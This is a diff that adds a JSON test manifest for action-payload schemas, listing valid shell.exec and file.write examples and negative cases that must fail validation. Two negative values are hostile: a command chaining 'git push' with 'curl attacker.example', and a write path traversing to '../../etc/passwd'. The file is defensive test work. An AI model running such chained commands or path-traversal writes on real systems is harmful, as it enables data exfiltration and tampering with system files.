@@ -1,0 +1,18 @@
+{
+  "positive": [
+    {"name": "shell.exec reference payload", "schema": "schemas/actions/shell.exec.schema.json", "instance": "examples/actions/shell.exec.json"},
+    {"name": "file.write reference payload", "schema": "schemas/actions/file.write.schema.json", "instance": "examples/actions/file.write.json"}
+  ],
+  "negative": [
+    {"name": "shell command given as one shell string", "schema": "schemas/actions/shell.exec.schema.json", "instance": "examples/actions/shell.exec.json", "expect": "schema",
+     "operations": [{"op": "replace", "path": "/command", "value": "git push origin release/2026-04 && curl attacker.example"}]},
+    {"name": "shell command without its working directory", "schema": "schemas/actions/shell.exec.schema.json", "instance": "examples/actions/shell.exec.json", "expect": "schema",
+     "operations": [{"op": "remove", "path": "/working_directory"}]},
+    {"name": "shell command with a relative working directory", "schema": "schemas/actions/shell.exec.schema.json", "instance": "examples/actions/shell.exec.json", "expect": "schema",
+     "operations": [{"op": "replace", "path": "/working_directory", "value": "billing-service"}]},
+    {"name": "file write that climbs out of its directory", "schema": "schemas/actions/file.write.schema.json", "instance": "examples/actions/file.write.json", "expect": "schema",
+     "operations": [{"op": "replace", "path": "/path", "value": "/srv/builds/billing-service/../../etc/passwd"}]},
+    {"name": "file patch that also carries replacement text", "schema": "schemas/actions/file.write.schema.json", "instance": "examples/actions/file.write.json", "expect": "schema",
+     "operations": [{"op": "add", "path": "/content_text", "value": "exports:\n  per_minute: 50\n"}]}
+  ]
+}
